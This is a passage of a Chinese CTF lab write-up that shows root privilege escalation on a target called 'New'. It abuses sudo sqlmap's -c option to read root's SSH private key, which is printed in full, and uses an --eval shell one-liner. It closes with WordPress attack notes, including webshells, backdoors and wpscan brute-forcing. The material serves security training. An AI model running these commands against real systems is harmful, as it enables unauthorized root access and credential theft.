Never ask <span class="hljs-keyword">for</span> user input, use the default behavior<br>    --binary-fields=..  Result fields having binary values (e.g. <span class="hljs-string">&quot;digest&quot;</span>)<br>    --check-internet    Check Internet connection before assessing the target<br>    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables<br>    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL<br>    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. <span class="hljs-string">&quot;logout&quot;</span>)<br>    --csv-del=CSVDEL    Delimiting character used <span class="hljs-keyword">in</span> CSV output (default <span class="hljs-string">&quot;,&quot;</span>)<br>    --charset=CHARSET   Blind SQL injection charset (e.g. <span class="hljs-string">&quot;0123456789abcdef&quot;</span>)<br>    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)<br>    --encoding=ENCOD..  Character encoding used <span class="hljs-keyword">for</span> data retrieval (e.g. GBK)<br>    --eta               Display <span class="hljs-keyword">for</span> each output the estimated <span class="hljs-keyword">time</span> of arrival<br>    --flush-session     Flush session files <span class="hljs-keyword">for</span> current target<br>    --forms             Parse and <span class="hljs-built_in">test</span> forms on target URL<br>    --fresh-queries     Ignore query results stored <span class="hljs-keyword">in</span> session file<br>    --gpage=GOOGLEPAGE  Use Google dork results from specified page number<br>    --har=HARFILE       Log all HTTP traffic into a HAR file<br>    --hex               Use hex conversion during data retrieval<br>    --output-dir=OUT..  Custom output directory path<br>    --parse-errors      Parse and display DBMS error messages from responses<br>    --preprocess=PRE..  Use given script(s) <span class="hljs-keyword">for</span> preprocessing (request)<br>    --postprocess=PO..  Use given script(s) <span class="hljs-keyword">for</span> postprocessing (response)<br>    --repair            Redump entries having unknown character marker (?)<br>    --save=SAVECONFIG   Save options to a configuration INI file<br>    --scope=SCOPE       Regexp <span class="hljs-keyword">for</span> filtering targets<br>    --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities<br>    --skip-waf          Skip heuristic detection of WAF/IPS protection<br>    --table-prefix=T..  Prefix used <span class="hljs-keyword">for</span> temporary tables (default: <span class="hljs-string">&quot;sqlmap&quot;</span>)<br>    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)<br>    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)<br>    --web-root=WEBROOT  Web server document root directory (e.g. <span class="hljs-string">&quot;/var/www&quot;</span>)<br><br>  Miscellaneous:<br>    These options <span class="hljs-keyword">do</span> not fit into any other category<br><br>    -z MNEMONICS        Use short mnemonics (e.g. <span class="hljs-string">&quot;flu,bat,ban,tec=EU&quot;</span>)<br>    --alert=ALERT       Run host OS <span class="hljs-built_in">command</span>(s) when SQL injection is found<br>    --beep              Beep on question and/or when SQLi/XSS/FI is found<br>    --dependencies      Check <span class="hljs-keyword">for</span> missing (optional) sqlmap dependencies<br>    --disable-coloring  Disable console output coloring<br>    --list-tampers      Display list of available tamper scripts<br>    --offline           Work <span class="hljs-keyword">in</span> offline mode (only use session data)<br>    --purge             Safely remove all content from sqlmap data directory<br>    --results-file=R..  Location of CSV results file <span class="hljs-keyword">in</span> multiple targets mode<br>    --sqlmap-shell      Prompt <span class="hljs-keyword">for</span> an interactive sqlmap shell<br>    --tmp-dir=TMPDIR    Local directory <span class="hljs-keyword">for</span> storing temporary files<br>    --unstable          Adjust options <span class="hljs-keyword">for</span> unstable connections<br>    --update            Update sqlmap<br>    --wizard            Simple wizard interface <span class="hljs-keyword">for</span> beginner <span class="hljs-built_in">users</span><br>[10:21:23] [WARNING] your sqlmap version is outdated<br></code></pre></td></tr></table></figure>
+<p>发现<code>-c</code>可以读取文件</p>
+<p>尝试读取<code>root</code>的私钥</p>
+<ul>
+<li><p>先读取<code>authorized_keys</code>，（有该文件才能使用私钥登录）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> /usr/bin/sqlmap -c /root/.ssh/authorized_keys<br>        ___<br>       __H__<br> ___ ___[,]_____ ___ ___  &#123;1.5.2#stable&#125;<br>|_ -| . [<span class="hljs-string">&#x27;]     | .&#x27;</span>| . |<br>|___|_  [)]_|_|_|__,|  _|<br>      |_|V...       |_|   http://sqlmap.org<br><br>[10:26:35] [CRITICAL] you have provided an invalid and/or unreadable configuration file (<span class="hljs-string">&#x27;MissingSectionHeaderError: File contains no section headers.</span><br><span class="hljs-string">file: &#x27;</span>/root/.ssh/authorized_keys<span class="hljs-string">&#x27;, line: 1</span><br><span class="hljs-string">&#x27;</span>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJLSzroyaI5CJA/xwd/KU8qS5KE+Sy8TeeaKX3+NfEf+ root@New\n<span class="hljs-string">&#x27;&#x27;</span>)<br>[10:26:35] [WARNING] your sqlmap version is outdated<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>再读取<code>id_ed25519</code>，找到私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> /usr/bin/sqlmap -c /root/.ssh/id_ed25519     <br>        ___<br>       __H__<br> ___ ___[(]_____ ___ ___  &#123;1.5.2#stable&#125;<br>|_ -| . [)]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [)]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   http://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[10:27:52] [CRITICAL] you have provided an invalid and/or unreadable configuration file (&#x27;</span>MissingSectionHeaderError: File contains no section headers.<br>file: <span class="hljs-string">&#x27;/root/.ssh/id_ed25519&#x27;</span>, line: 1<br><span class="hljs-string">&#x27;-----BEGINOPENSSHPRIVATEKEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/gAAAJABMRbsATEW7AAAAAtzc2gtZWQyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/gAAAEAOtKwQ02tXjPMfbI2/sWqEVhc1bmdH8uGINK2y4UN005LSzroyaI5CJA/xwd/KU8qS5KE+Sy8TeeaKX3+NfEf+AAAACHJvb3RATmV3AQIDBAU=-----ENDOPENSSHPRIVATEKEY-----&#x27;</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">[10:27:52] [WARNING] your sqlmap version is outdated</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>处理私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> <span class="hljs-built_in">id</span> | sed -r <span class="hljs-string">&#x27;s/-----[A-Z]+-----//g&#x27;</span> | sed -r <span class="hljs-string">&#x27;s/.&#123;70&#125;/&amp;\n/g&#x27;</span> <br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/gAAAJABMRbsATEW<br>7AAAAAtzc2gtZWQyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/g<br>AAAEAOtKwQ02tXjPMfbI2/sWqEVhc1bmdH8uGINK2y4UN005LSzroyaI5CJA/xwd/KU8qS<br>5KE+Sy8TeeaKX3+NfEf+AAAACHJvb3RATmV3AQIDBAU=<br></code></pre></td></tr></table></figure>
+
+<p>形成私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/gAAAJABMRbsATEW<br>7AAAAAtzc2gtZWQyNTUxOQAAACCS0s66MmiOQiQP8cHfylPKkuShPksvE3nmil9/jXxH/g<br>AAAEAOtKwQ02tXjPMfbI2/sWqEVhc1bmdH8uGINK2y4UN005LSzroyaI5CJA/xwd/KU8qS<br>5KE+Sy8TeeaKX3+NfEf+AAAACHJvb3RATmV3AQIDBAU=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>登录<code>root</code>用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh root@192.168.2.43 -i 1<br>Linux New 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Tue Jul  1 08:08:27 2025 from 192.168.3.94<br>root@New:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@New:~# <br></code></pre></td></tr></table></figure>
+
+<p><strong>ROOT FALG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@New:~# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-12e5770e-5667-11f0-8acc-4fa40e22b275&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、WordPress渗透"><a href="#1、WordPress渗透" class="headerlink" title="1、WordPress渗透"></a>1、WordPress渗透</h2><p> <strong>信息收集：锁定突破口</strong></p>
+<ul>
+<li><strong>指纹识别</strong>：通过<code>/wp-admin/</code>、<code>/wp-includes/</code>等路径识别WordPress版本，寻找已知漏洞。  </li>
+<li><strong>主题&#x2F;插件探测</strong>：扫描<code>/wp-content/themes/</code>和<code>/wp-content/plugins/</code>目录，获取插件名称及版本（如使用<code>WPScan</code>工具）。  </li>
+<li><strong>敏感文件泄露</strong>：查找<code>wp-config.php</code>备份文件（如<code>wp-config.php.bak</code>），可能泄露数据库账号密码。</li>
+</ul>
+<p><strong>漏洞利用：四大高危方向</strong></p>
+<ul>
+<li><strong>核心程序漏洞</strong>：如CVE-2022-21661（SQL注入）、CVE-2022-21662（权限提升）。  </li>
+<li><strong>插件&#x2F;主题漏洞</strong>：  <ul>
+<li>文件上传漏洞（如未过滤的<code>.php</code>文件上传）。  </li>
+<li>SQL注入（如某表单未做参数过滤）。  </li>
+<li>远程代码执行（RCE）。</li>
+</ul>
+</li>
+<li><strong>弱口令爆破</strong>：针对<code>wp-login.php</code>页面，使用字典爆破管理员密码。  </li>
+<li><strong>权限提升</strong>：通过低权限账户（如投稿作者）结合插件漏洞获取管理员权限。</li>
+</ul>
+<p><strong>权限维持与横向移动</strong></p>
+<ul>
+<li><strong>写入Webshell</strong>：通过文件上传或编辑主题文件插入恶意代码。  </li>
+<li><strong>据库后门</strong>：在<code>wp_posts</code>表中插入PHP代码，实现持久化控制。  </li>
+<li><strong>嗅探敏感数据</strong>：窃取用户信息、支付数据，甚至控制服务器。</li>
+</ul>
+<h2 id="2、wpscan使用教程"><a href="#2、wpscan使用教程" class="headerlink" title="2、wpscan使用教程"></a>2、wpscan使用教程</h2><ul>
+<li>全站扫描：输出 WordPress 核心、插件、主题版本信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --api-token=xxxx<br></code></pre></td></tr></table></figure></li>
+<li>模糊扫描（无 Token）：仅显示版本号，无漏洞详情<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --no-api-token<br></code></pre></td></tr></table></figure></li>
+<li>插件漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --enumerate p<br></code></pre></td></tr></table></figure></li>
+<li>主题漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --enumerate t<br></code></pre></td></tr></table></figure></li>
+<li>用户枚举<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --enumerate u<br></code></pre></td></tr></table></figure></li>
+<li>指定用户爆破<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --username admin --wordlist /path/to/passwords.txt<br><span class="hljs-comment">#多线程加速</span><br>添加 --threads 30 提升效率<br></code></pre></td></tr></table></figure></li>
+<li>文件扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --enumerate tt<br></code></pre></td></tr></table></figure></li>
+<li>组合命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://example.com --api-token YOUR_TOKEN --enumerate u,p,t,vp,vt --username admin --wordlist /dicts/top1000.txt --threads 20<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="3、Sqlmap提权"><a href="#3、Sqlmap提权" class="headerlink" title="3、Sqlmap提权"></a>3、Sqlmap提权</h2><h3 id="方案一：sudo-1"><a href="#方案一：sudo-1" class="headerlink" title="方案一：sudo"></a>方案一：sudo</h3><p><code>sqlmap</code>命令具有<code>sudo</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> sqlmap -u 127.0.0.1 --<span class="hljs-built_in">eval</span>=<span class="hljs-string">&quot;import os; os.system(&#x27;/bin/sh&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="方案二：读取私钥文件"><a href="#方案二：读取私钥文件" class="headerlink" title="方案二：读取私钥文件"></a>方案二：读取私钥文件</h3><p><code>sqlmap</code>命令参数<code>-c</code>，可以读取文件，可以读取<code>root</code>用户的ssh私钥</p>
+<h2 id="4、读取SSH私钥的步骤"><a href="#4、读取SSH私钥的步骤" class="headerlink" title="4、读取SSH私钥的步骤"></a>4、读取SSH私钥的步骤</h2><ol>
+<li>SSH私钥默认存储在用户主目录的<code>.ssh</code>隐藏文件夹中</li>
+<li>首先查看是否有文件<code>authorized_keys</code>，必须拥有该文件才能使用私钥登录</li>
+<li>根据<code>authorized_keys</code>，查看私钥的文件名，一般是<code>id_rsa</code>或者<code>id_ed25519</code></li>
+<li>验证私钥格式，确保私钥格式符合 OpenSSH 标准（以 <code>-----BEGIN OPENSSH PRIVATE KEY-----</code> 开头，以 <code>-----END OPENSSH PRIVATE KEY-----</code> 结尾），同时私钥每行<code>70</code>个字符</li>
+<li>私钥文件的权限必须为<code>600</code>，否则SSH客户端会拒绝使用</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/" class="category-chain-item">内部靶机/Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wordpress/" class="print-no-link">#wordpress</a>
+      
+        <a href="/tags/CVE-2019-9978/" class="print-no-link">#CVE-2019-9978</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-sqlmap/" class="print-no-link">#提权-sqlmap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>New</div>
+      <div>http://miao-sec.github.io/内部靶机-Maze-sec/New/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E5%86%85%E9%83%A8%E9%9D%B6%E6%9C%BA-Maze-sec/Leak/" title="Leak">
+                        <span class="hidden-mobile">Leak</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <link rel="stylesheet" href="/dist/APlayer.min.css"> <div id="aplayer"></div> <script type="text/javascript" src="/dist/APlayer.min.js"></script> <script type="text/javascript" src="/js/music.js"></script> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
